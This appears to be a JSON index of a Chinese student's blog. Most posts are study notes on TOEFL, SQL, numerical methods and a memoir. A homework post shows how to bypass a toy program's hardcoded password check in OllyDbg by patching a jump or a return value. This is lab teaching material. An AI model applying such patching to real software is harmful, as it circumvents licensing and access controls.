caller","categories":[{"name":"计算机组成原理","slug":"计算机组成原理","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"}],"tags":[]},{"title":"阅读错误总结","slug":"英语/托福/阅读错误总结","date":"2020-04-06T01:26:00.000Z","updated":"2020-04-24T00:40:01.613Z","comments":true,"path":"2020/04/06/英语/托福/阅读错误总结/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/06/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E9%98%85%E8%AF%BB%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93/","excerpt":"","text":"TPO46The Origins of Writing radical 激进的；彻底的 radically 彻底地 The Commercial Revolution in Medieval Europe At cities such as Bruges and London, Hanseatic merchants secured special trading concessions, exempting them from all tolls and allowing them to trade at local fairs. 在布鲁日和伦敦等城市，汉萨商人获得特殊的贸易优惠，免除了所有的过路费，并且允许他们在当地的集市做买卖。 secure adj. 安心的; 有把握的; 可靠的; 牢靠的; 稳固的; 安全的; 稳妥的; v. (尤指经过努力) 获得，取得，实现; 拴牢; 扣紧; 关严; 保护; 保卫; 使安全; finished product 成品 精读：https://top.zhan.com/toefl/read/practicereview-714-12-107586700-5.html?ingress=single","categories":[{"name":"TOEFL","slug":"TOEFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/TOEFL/"}],"tags":[{"name":"英语","slug":"英语","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%8B%B1%E8%AF%AD/"},{"name":"阅读","slug":"阅读","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E9%98%85%E8%AF%BB/"}]},{"title":"千锋网安","slug":"千锋网安","date":"2020-04-03T13:15:49.000Z","updated":"2020-04-03T13:50:22.542Z","comments":true,"path":"2020/04/03/千锋网安/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/03/%E5%8D%83%E9%94%8B%E7%BD%91%E5%AE%89/","excerpt":"","text":"vmware 虚拟机克隆，链接方式依赖于原虚拟机，省空间 快照 系统：http://msdn.itellyou.cn, U盘作为装系统的光盘，驱动精灵 路由器 连接内网和外网，交换机组建局域网 ip：32位二进制","categories":[],"tags":[{"name":"网安","slug":"网安","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"sql语句","slug":"sql语句","date":"2020-04-01T15:21:47.000Z","updated":"2020-04-02T06:16:49.848Z","comments":true,"path":"2020/04/01/sql语句/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/04/01/sql%E8%AF%AD%E5%8F%A5/","excerpt":"","text":"SHOW DATABASE –显示当前的数据库 CREATE DATABASE XXX –创建数据库 DEFAULT CHARACTER SET utf8mb4DEFAULT COLLATE utf8mb4_unicode_ci; USE XXX; CREATE TABLE IF NOT EXISTS airline( –创建数据表code char(3) PRIMARY KEY,airlinename varchar(1024)); ALTER TABLE S ADD FOREIGN KEY (a) REFERENCES E(a), ADD FOREIGN KEY (c) REFERENCES F(c);","categories":[{"name":"major","slug":"major","permalink":"https://gitee.com/michelle19l/michelle19l/categories/major/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"数据库上机L4","slug":"数据库/数据库上机L4","date":"2020-03-31T13:53:54.000Z","updated":"2020-07-13T01:24:52.796Z","comments":true,"path":"2020/03/31/数据库/数据库上机L4/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/31/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL4/","excerpt":"","text":"空值再检索操作存储等方面都有不好的影响","categories":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"power designer入门","slug":"power-designer入门","date":"2020-03-29T08:28:09.000Z","updated":"2020-03-30T12:12:17.053Z","comments":true,"path":"2020/03/29/power-designer入门/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/29/power-designer%E5%85%A5%E9%97%A8/","excerpt":"PD的安装与配置 画ER图","text":"PD的安装与配置 画ER图 一、安装、破解和汉化略 二、用power designer画ER图新建模型 create model conceptual实体 新建实体 右键，恢复光标 双击实体，编辑 子类 空值方法 ER方法关系 建立表 自动生成sql语句 Database -&gt; Generate Database -&gt; Ok -&gt; Edit PowerDesigner中各种表关系的区别：https://wenku.baidu.com/view/e57c230d03020740be1e650e52ea551810a6c93a.html","categories":[{"name":"major","slug":"major","permalink":"https://gitee.com/michelle19l/michelle19l/categories/major/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"Power Designer","slug":"Power-Designer","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Power-Designer/"}]},{"title":"数据库上机L3","slug":"数据库/数据库上机L3","date":"2020-03-26T12:30:30.000Z","updated":"2020-07-13T01:24:38.209Z","comments":true,"path":"2020/03/26/数据库/数据库上机L3/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/26/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL3/","excerpt":"数值类型：满足要求下，尽量使用“短”数据类型 字符串类型：char、varchar，字符与字节数的关系 日期类型：datetime、timestamp、（int unsigned） 复合类型：enum、set 二进制类型：blob、text 选择原则选择合适的数据类型，不仅可以节省储存空间，还可以有效地提升数据的计算性能。","text":"数值类型：满足要求下，尽量使用“短”数据类型 字符串类型：char、varchar，字符与字节数的关系 日期类型：datetime、timestamp、（int unsigned） 复合类型：enum、set 二进制类型：blob、text 选择原则选择合适的数据类型，不仅可以节省储存空间，还可以有效地提升数据的计算性能。 tynint(2) 括号内数字表示显示宽度 （图片转载自https://blog.csdn.net/li295214001/article/details/51322018） - 255代表字符长度而不是字节长度 - 长度小于255用一个字节记录，大于用两个 gbk 2字节、utf-8 3字节 char存储时去掉字符串末尾空格，varchar不会 datetime 8字节，timestamp 4 字节 unix时间戳 1970到现在的时间 数据很多，大量排序、查询-&gt;int存储时间 enum 单选，set复选 二进制类型-&gt;01构成的字符串，以字节为单位进行存储。字符串以字符为单位存储 IP地址最好选择整型进行存储，存储空间小，查询速度快","categories":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"听力单词已背科目","slug":"英语/托福/听力单词已背科目","date":"2020-03-25T08:10:19.000Z","updated":"2020-04-24T00:41:42.251Z","comments":true,"path":"2020/03/25/英语/托福/听力单词已背科目/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/25/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/%E5%90%AC%E5%8A%9B%E5%8D%95%E8%AF%8D%E5%B7%B2%E8%83%8C%E7%A7%91%E7%9B%AE/","excerpt":"","text":"生命科学 生物学 海洋生物学 动物学 植物学","categories":[{"name":"TOEFL","slug":"TOEFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/TOEFL/"}],"tags":[{"name":"听力","slug":"听力","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%90%AC%E5%8A%9B/"},{"name":"英语","slug":"英语","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%8B%B1%E8%AF%AD/"}]},{"title":"计算方法第五章错题总总结","slug":"计算方法第五章错题总总结","date":"2020-03-24T10:05:50.000Z","updated":"2020-03-24T11:52:29.246Z","comments":true,"path":"2020/03/24/计算方法第五章错题总总结/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/24/%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%E7%AC%AC%E4%BA%94%E7%AB%A0%E9%94%99%E9%A2%98%E6%80%BB%E6%80%BB%E7%BB%93/","excerpt":"解方程组 范数","text":"解方程组 范数","categories":[{"name":"major","slug":"major","permalink":"https://gitee.com/michelle19l/michelle19l/categories/major/"}],"tags":[{"name":"计算方法","slug":"计算方法","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/"}]},{"title":"网站导航","slug":"网站导航","date":"2020-03-24T03:52:08.000Z","updated":"2020-03-24T11:54:56.938Z","comments":true,"path":"2020/03/24/网站导航/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/24/%E7%BD%91%E7%AB%99%E5%AF%BC%E8%88%AA/","excerpt":"各种网站收集，欢迎推荐","text":"各种网站收集，欢迎推荐 一、学习1、课程 bilibili大学：https://www.bilibili.com/ 雨课堂网页版：https://changjiang.yuketang.cn/web 莫凡PYTHON：https://morvanzhou.github.io/ coursera：https://www.coursera.org/2、练习 a、代码 洛谷：https://www.luogu.com.cn/ codeforces：http://codeforces.com/contests b、英语 小站托福：https://top.zhan.com/toefl/ bing词典：https://cn.bing.com/dict/ 二、办公 学生邮箱：https://mailhz.qiye.163.com/js6/main.jsp?sid=o0uA9A10S7AFM7qBf6Q-S10Qirfg9Tes&amp;hl=zh_CN#module=welcome.CorpWelcomeModule%7C%7B%7D webvpn：https://webvpn.nankai.edu.cn/ 三、功能（博主自己使用） 网站内容更新：https://gitee.com/michelle19l/michelle19l/pages","categories":[{"name":"Guide","slug":"Guide","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Guide/"}],"tags":[{"name":"资料收集整理","slug":"资料收集整理","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86/"}]},{"title":"漏洞测试作业三：OLLYDBG软件破解","slug":"漏测作业/漏测作业三","date":"2020-03-23T10:06:07.000Z","updated":"2020-06-12T04:03:39.176Z","comments":true,"path":"2020/03/23/漏测作业/漏测作业三/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/23/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%89/","excerpt":"ollydbg使用入门","text":"ollydbg使用入门 题目一 代码： #include &lt;iostream&gt;using namespace std;# define password \"12345678\"bool verifyPwd(char* pwd)&#123; int flag; flag = strcmp(password,pwd); return flag==0;&#125;void main()&#123; bool bFlag; char pwd[1024]; printf(\"please input password:\"); while(1) &#123; scanf(\"%s\",pwd); bFlag=verifyPwd(pwd); if(bFlag) &#123; printf(\"passed\\n\"); break; &#125;else &#123; printf(\"wrong password, please input again:\\n\"); &#125; &#125;&#125; 使用debug模式运行，拿到exe文件 用ollydbg打开，单步执行 单步调试，找到主函数 F7步入 跳转至主函数 输入 找到verifyPwd函数 跳转到verifyPwd函数 在学习的过程中，使用vc6查看已经划分好的反汇编代码 其中框出的部分为调用verifyPwd函数并将返回值赋给bFlag的代码 反汇编代码 作用 lea edx,[ebp-404h] [enp-404]中存储的是输入的字符串 push edx 字符串地址入栈 call @ILT+15(verifyPwd) (00401014) 函数跳转 add esp,4 将函数调用前push的edx值弹出 mov byte ptr [ebp-4],al 将函数返回值赋给bFlag 题目二 flag==0，即输入字符串为“12345678” 跳转进入函数 进入strcmp ![image-20200323105229337](/images/漏测作业/漏测作业三/image-20200323105229337.png&gt; verifyPwd函数： 地址 汇编代码 注释 寄存器 00401030 push ebp ; 2_1_1.verifyPwd(void) 00401031 mov ebp,esp 00401033 sub esp,44 00401036 push ebx 00401037 push esi 00401038 push edi 00401039 lea edi,[ebp-44] 0040103C mov ecx,11 00401041 mov eax,CCCCCCCC 00401046 rep stos dword ptr [edi] 00401048 mov eax,dword ptr [ebp+8] 0040104B push eax 0040104C push offset 0043101C ; ASCII “12345678” 00401051 call strcmp ; [strcmp 调用函数 00401056 add esp,8 eax=0（strcmp函数返回值） 00401059 mov dword ptr [ebp-4],eax 将寄存器eax的值写入内存 0040105C xor eax,eax eax清零 0040105E cmp dword ptr [ebp-4],0 flag==0 返回值与0进行比较 00401062 sete al 设置al，如果相等则设置 00401065 pop edi eax=1，即verifyPwd返回值为1 00401066 pop esi 00401067 pop ebx 00401068 add esp,44 0040106B cmp ebp,esp 0040106D call _chkesp 00401072 mov esp,ebp 00401074 pop ebp 00401075 retn strcmp函数 地址 汇编代码 注释 寄存器 00408220 mov edx,dword ptr [esp+4] ; ASCII “12345678”（原密码） 00408224 mov ecx,dword ptr [esp+8] ; ASCII “12345678”（用户输入部分） 00408228 test edx,00000003 0040822E jnz short 0040826C 00408230 mov eax,dword ptr [edx] eax=34333231（对应密码前四位，小端存储） 00408232 cmp al,byte ptr [ecx] al与[ecx]第一位比较，相等 al=31 00408234 jne short 00408264 不跳转 00408236 or al,al al不为0 00408238 jz short 00408260 不跳转 0040823A cmp ah,byte ptr [ecx+1] ah=32 0040823D jne short 00408264 不跳转 0040823F or ah,ah 00408241 jz short 00408260 不跳转 00408243 shr eax,10 eax右移16位 eax=00003433 00408246 cmp al,byte ptr [ecx+2] al=33 00408249 jne short 00408264 0040824B or al,al 0040824D jz short 00408260 0040824F cmp ah,byte ptr [ecx+3] ah=34 00408252 jne short 00408264 00408254 add ecx,4 访问后四位数据 ecx=38373635 00408257 add edx,4 edx=38373635 0040825A or ah,ah ah=34 0040825C jnz short 00408230 or结果不为0，跳转至该表第五行，eax被赋值为38373635 0040825E mov edi,edi 00408260 xor eax,eax 所有判断均相等 eax=0 00408262 retn f返回 题目三 方法一找到跳转语句 修改 跳转成功 方法二找到返回值设置代码 更改为“返回1” 继续运行，返回eax=1 跳转成功并输出passed","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"ollydbg使用入门","slug":"ollydbg使用入门","permalink":"https://gitee.com/michelle19l/michelle19l/tags/ollydbg%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/"}]},{"title":"漏洞测试作业二：IDE反汇编函数调用实验","slug":"漏测作业/漏测作业二","date":"2020-03-20T15:36:09.000Z","updated":"2020-06-12T03:55:06.305Z","comments":true,"path":"2020/03/20/漏测作业/漏测作业二/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/20/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%BA%8C/","excerpt":"IDE反汇编函数调用实验","text":"IDE反汇编函数调用实验 第一题题目请在XP VC6下调试课本的示例程序并将call语句执行过程中的EIP变化、ESP、EBP变化等状态进行记录，解释变化的主要原因 解答int add(int x, int y)&#123; int z &#x3D; 0; z &#x3D; x + y; return z;&#125;void main()&#123; int n &#x3D; 0; n &#x3D; add(1, 3); printf(&quot;%d\\n&quot;, n);&#125; (加粗表示寄存器数据发生变化，表格中数据表示该行指令执行前的数据) 汇编步骤 EIP ESP EBP 11: n = add(1, 3); 0040108F push 3 00401091 push 1 00401093 call @ILT+0(add) (00401005) 00401093 0012FF28 0012FF80 00401098 add esp,8 00401098 0012FF28 0012FF80 0040109B mov dword ptr [ebp-4],eax 00401005 jmp add(00401030) 00401005 0012FF24 0012FF80 2: int add(int x, int y) 3: { (省略未变化部分) 00401030 push ebp 00401030 0012FF24 0012FF80 00401031 mov ebp,esp 00401031 0012FF20 00401033 sub esp,44h 00401033 0012FF20 00401036 push ebx 00401036 0012FEDC 00401037 push esi 00401037 0012FED8 00401038 push edi 00401038 0012FED4 00401039 lea edi,[ebp-44h] 00401039 0012FED0 0040103C mov ecx,11h 0040103C 00401041 mov eax,0CCCCCCCCh 00401041 00401046 rep stos dword ptr [edi] 00401046 4: int z = 0; 00401048 mov dword ptr [ebp-4],0 00401048 5: z = x + y; 0040104F mov eax,dword ptr [ebp+8] 0040104F 00401052 add eax,dword ptr [ebp+0Ch] 00401052 00401055 mov dword ptr [ebp-4],eax 00401055 6: return z; 00401058 mov eax,dword ptr [ebp-4] 00401058 7: } 0040105B pop edi 0040105B 0040105C pop esi 0040105C 0012FED4 0040105D pop ebx 0040105D 0012FED8 0040105E mov esp,ebp 0040105E 0012FEDC 00401060 pop ebp 00401060 0012FF20 00401061 ret 00401061 0012FF24 0012FF80 寄存器变化原因 EIP： 指向下一步要进行的指令位置，随汇编代码执行过程改变 ESP： PUSH，POP操作导致栈顶变化 函数调用过程中的栈帧变化 直接对ESP的值进行修改 EBP: 函数调用过程中的栈帧变化 调用函数 mov ebp,esp函数返回 pop ebp 第二题题目相同的程序，请在非XP的当前windows操作系统的vs2003以上版本中运行，绘制add函数执行时的栈状态，并与XP下同时刻的状态进行比较 解答 与xp系统下的vc6栈状态不同： vc6栈帧预留空间为044h sub esp,044h vs2019为0CChsub esp,0CCh","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"寄存器","slug":"寄存器","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%AF%84%E5%AD%98%E5%99%A8/"}]},{"title":"数据库上机参考资料总结","slug":"数据库上机参考资料总结","date":"2020-03-17T09:34:30.000Z","updated":"2020-03-17T09:37:41.027Z","comments":true,"path":"2020/03/17/数据库上机参考资料总结/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BA%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%E6%80%BB%E7%BB%93/","excerpt":"课堂参考资料","text":"课堂参考资料 L2 文档：创建数据库&amp;插入数据存储过程代码链接：http://dwz.date/Nkr 文档：WordPress数据字典.note链接：http://dwz.date/N43 文档：Discuz! X3 数据字典.no…链接：http://dwz.date/N46","categories":[{"name":"major","slug":"major","permalink":"https://gitee.com/michelle19l/michelle19l/categories/major/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"2020-03 听力总结","slug":"英语/托福/2020-03 听力总结","date":"2020-03-17T09:05:45.000Z","updated":"2020-04-24T00:42:49.472Z","comments":true,"path":"2020/03/17/英语/托福/2020-03 听力总结/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/17/%E8%8B%B1%E8%AF%AD/%E6%89%98%E7%A6%8F/2020-03%20%E5%90%AC%E5%8A%9B%E6%80%BB%E7%BB%93/","excerpt":"单词 语言表达","text":"单词 语言表达 2020-3-26 表达 释义/注意点 gazette n.报纸/v.刊载 budding 发育期的 a budding historian 初学历史学的学生 day-to-day life 日常生活 publication 出版物 deteriorated 变质的 French national constituent assembly 法国国民议会大会的形成 editorials 社论 present a paper on press 出版社 2020-3-26 表达 释义/注意点 cement 巩固 cement my interest in doing the reason I came by is …… straw poll 选举前的非正式民意测验 conduct a straw poll on campus ballot 投票 hold an informal ballot general election 正式选举 political leaning 政治倾向 identify with 相同于、认同 faculty advisor 指导教师 I’m flattered. 我太荣幸了 my schedule is so jammed the paper is not due till after the election 论文指导选举结束后才截止 referenda 全民公决 sports arena 体育竞技场 referendum 公民投票权 referendum participation rates 全民公投参与率 proposal 提议 term page 学期论文 The reason I came by is we are getting ready to conduct a straw poll on campus, you know, hold an informal ballot since the general election is just a couple of months away. We want to get a field from the students’ bodies political leanings, like who students are planning to vote for, which political party people identify with, that sort of thing. ——我们想了解一下学生群体的政治倾向，比如学生们打算给哪些人投票，比较认同哪些政治团体，这样的事情。 I was hoping you might be interested. There is one on whether to ban smoking in restaurants. whether to spend tax dollars for a new sports arena in the city. In regular elections, the vast majority of voters ignore referenda. 在普通的大选里，大多数的投票人会无视全民公决 2020-3-24 表达 释义/注意点 ecological niche 生态位 2020-3-19 表达 释义/注意点 get into it original play 原创戏剧 That’s the direct quote from …… 直接引用……的话 two “e”s 注意连读/twui:s/ unabashedly 不害臊地 playwright 剧作家 dramatic literature 戏剧文学 be construed as 被解释为 drive home the point that …./drive a home point 讲明观点、问题 grant 承认 overstate 夸张 of one’s day 和某人同时期 Well, part of what Mee’s trying to do is drive home the point that: One theater’s always a collaborative effort. I’ll grant that he’s overstating things somewhat. ——我承认他这话有点夸张。like most writers of his day 表达 释义/注意点 up front 预先 display case 展示柜 recoup 收回，偿还 recoup the cost of my materials independently owned 个体独立经营的 unlike ceramic 陶器 vendor 卖主，小贩 nominal 名义上的，象征性的 line up 排列 haul 拖 But they would’nt pay you up front. ——他们不会预支 The vendor fee is nominal. ——摆摊费只是象征性地收取 I don’t have a car to haul everything down there. 2020-3-18 表达 释义 be taken aback by sth. 因……而吃惊 require course 必修课 elective course 选修课 cultivate a sense of good will 陶冶高尚情操 allude to sth. 提到…… give you a good overview of the field commit oneself 承担义务，做出承诺（要求等）说出肯定的意见 commit oneself to doing sth. 致力于做某事 accounting 会计学 avoid becoming isolated from Not necessarily. 那不一定。 These courses will give you a good overview of the field before commiting yourself. Well, I endured accounting …….. and barely stay awake. I have got two require courses and two electives. 2020-3-16 表达 释义 determine 做出判定，判决，限定 I feel like I’m skating ice on her. 我感觉我和她关系如履薄冰。 The plot thickens. 事情越来越复杂了。","categories":[{"name":"TOEFL","slug":"TOEFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/TOEFL/"}],"tags":[{"name":"听力","slug":"听力","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%90%AC%E5%8A%9B/"},{"name":"英语","slug":"英语","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%8B%B1%E8%AF%AD/"}]},{"title":"第五章 解线性方程组的直接方法","slug":"计算方法：第五章-解方程组-总结","date":"2020-03-17T08:16:00.000Z","updated":"2020-03-25T09:40:20.404Z","comments":true,"path":"2020/03/17/计算方法：第五章-解方程组-总结/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/17/%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95%EF%BC%9A%E7%AC%AC%E4%BA%94%E7%AB%A0-%E8%A7%A3%E6%96%B9%E7%A8%8B%E7%BB%84-%E6%80%BB%E7%BB%93/","excerpt":"计算方法总结","text":"计算方法总结 5.1 引言与预备知识5.1.1 引言5.1.2 向量和矩阵5.1.3 矩阵的特征值与谱半径5.1.4 特殊矩阵5.2 高斯消去法高斯消去法矩阵的三角分解 A=LU，其中每列中的l均为前面的列计算之后的比例 例题：书P148 例三 ​ 列主元消去法 每列中选取绝对值最大的元素 全主元消去法 每一步选取系数矩阵或消元后的低阶矩阵中绝对值最大的元素作为主元素 时间代价大 5.3 矩阵三角分解法直接三角分解法1.不选主元 -&gt; 杜利特尔 2.选主元 PA=LU Ly=Pb, Ux=y 平方根法 A是正定矩阵，，则有 改进 -&gt;避免开方计算 追赶法 5.4 向量与矩阵的范数 5.5 误差分析5.5.1 矩阵的条件数 5.5.2 迭代改善法","categories":[{"name":"study","slug":"study","permalink":"https://gitee.com/michelle19l/michelle19l/categories/study/"}],"tags":[{"name":"计算方法","slug":"计算方法","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%AE%A1%E7%AE%97%E6%96%B9%E6%B3%95/"}]},{"title":"数据库上机L2","slug":"数据库/数据库上机L2：创建数据库-插入数据存储过程代码","date":"2020-03-16T13:03:31.000Z","updated":"2020-07-13T01:24:16.240Z","comments":true,"path":"2020/03/16/数据库/数据库上机L2：创建数据库-插入数据存储过程代码/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/16/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8A%E6%9C%BAL2%EF%BC%9A%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E4%BB%A3%E7%A0%81/","excerpt":"创建数据库 插入数据存储过程代码","text":"创建数据库 插入数据存储过程代码 创建work1.sql文件 -- 创建表CREATE TABLE &#96;innodb&#96;( &#96;id&#96; int(11) NULL DEFAULT 0, &#96;data&#96; int(11) NULL DEFAULT 0) ENGINE&#x3D;InnoDB;CREATE TABLE &#96;myisam&#96;( &#96;id&#96; int(11) NULL DEFAULT 0, &#96;data&#96; int(11) NULL DEFAULT 0) ENGINE&#x3D;myisam;create procedure myinsert(a int) begin declare i int default 1; repeat insert into &#96;innodb&#96; VALUES(i,i); set i&#x3D;i+1; until i&gt;a end repeat; end;-- 执行存储过程call myinsert(10000);-- 删除myinsert函数drop procedure if exists myinsert; 可以编写sql文件，也可在命令列界面中分步运行 运行之后需要刷新","categories":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"漏洞测试作业一：虚拟机的安装","slug":"漏测作业/漏测作业一","date":"2020-03-15T08:53:03.000Z","updated":"2020-06-12T03:42:19.142Z","comments":true,"path":"2020/03/15/漏测作业/漏测作业一/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/03/15/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E4%B8%80/","excerpt":"VMWARE安装 KALI安装 Windows XP虚拟机安装 windows下ida和ollydbg的安装","text":"VMWARE安装 KALI安装 Windows XP虚拟机安装 windows下ida和ollydbg的安装 一、VMWARE安装 解压文件，点击exe文件 接受许可协议，点击下一步 选择安装路径，一直点击下一步 输入密钥 安装完成 二、KALI安装 在官网找到安装文件，我使用的是kali2020.1 installer 点击“创建新的虚拟机”“下一步” 选择安装程序光盘影响文件 根据安装包，这里选择了Debian 最新版的64位系统进行配置 检查配置，注意需要将内存修改至KALI的最低需求1024MB，否则安装时会进入Low Memory模式) 开启虚拟机，进行安装 选择Graphical install 选择语言和地区 依次选择 安装完成 配置中文字符集 配置完成 三、Windows XP虚拟机安装 打开VMware，点击新建虚拟机，选择“下一步” 选择windows光盘映像文件 输入产品密钥 使用默认配置即可 系统安装完成，重启该虚拟机 自动安装VMTools 完成 四、windows下ida和ollydbg的安装 将压缩文件解压后复制到虚拟机内（VMTools已安装，可以实现虚拟机和主机之间的文件传输） 软件均可正常打开 实验心得 学习利用网络资源解决安装中遇到的各种问题 初步学习使用命令行进行环境配置","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"}]},{"title":"高中回忆30条","slug":"mylife/中学回忆 - 副本","date":"2020-02-24T13:21:40.000Z","updated":"2020-05-26T09:11:29.798Z","comments":true,"path":"2020/02/24/mylife/中学回忆 - 副本/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/02/24/mylife/%E4%B8%AD%E5%AD%A6%E5%9B%9E%E5%BF%86%20-%20%E5%89%AF%E6%9C%AC/","excerpt":"海棠花瓣会随风吹散，但记忆不会🌸","text":"海棠花瓣会随风吹散，但记忆不会🌸 1.你为什么选择这个高中因为一些原因在nkzx带了六年，没有其它的选择，百年学府、文化底蕴、人文气息，初中三年给我留下了很多美好的回忆，没有过离开的想法。很幸运能在这里度过自己的12岁到18岁，其实不只是和伙伴一起成长，老师见证了我们的青春，我们也是老师人生历程的一部分吧，从第一年教学生，到结婚，再到生子；或者看着某位老师从头发旺盛到emmm，时间真的是个很奇妙的东西 2.它的地理位置，周围建筑南开洼，真的洼，雨下大了水没过膝盖 周围建筑哈哈哈，那就是学校周围的各种快餐店了哈哈哈，见证了几个711的开张又关张（中学时觉得711还挺好吃的，到了大学，唉） 3.初见面六年级的冬令营，当时班里还有四个和我一天生日的同学 4.讲一下你的班主任吧初中换了几位班主任，都对我很好。高中是充满智慧的宋神嘻嘻，突然想起来某位同学上课看球赛直播发说说感慨忘记屏蔽班主任了哈哈哈 5.你最好的同学大多是六年都在一个班的同学。其实我所处的这个体制有一点弊端就是高中之后大多数同学还是和初中关系好的同学交往，再和其他人建立非常亲密的同学关系稍微有点苦难，有点可惜。但是六年下来还是收获了不少朋友，可以一起躺在床上聊天的xyy，一起约自习的（han 